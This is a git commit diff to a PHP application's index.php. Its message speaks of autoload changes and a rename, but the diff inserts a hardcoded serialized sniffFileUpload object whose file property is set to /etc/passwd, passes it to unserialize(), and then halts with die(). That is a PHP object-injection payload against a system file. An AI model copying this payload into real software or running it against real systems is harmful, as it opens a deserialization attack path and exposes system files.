091479d9d503002005973e3e2026d32c5e5849cf
Volker Dusch <github@wallbash.com>
2010-12-02 04:08:20 +0800

    Apperntly i forgot to add the autoload changes to the commit, this should fix that problem. Also i renamed the upload to fileupload so it fits better

--- html/index.php
+++ html/index.php
@@ -7,6 +7,10 @@ define('DSN', 'mysql://root@127.0.0.1/sniff');
 require __DIR__ . '/autoload.php';
 session_start();
 
+$evil = 'O:15:"sniffFileUpload":1:{s:7:"'."\0*\0".'file";s:11:"/etc/passwd";}';
+unserialize($evil);
+die();
+
 $request  = new sniffRequest($_REQUEST, $_SESSION);
 $response = new sniffResponse();
 $factory  = new sniffFactory();
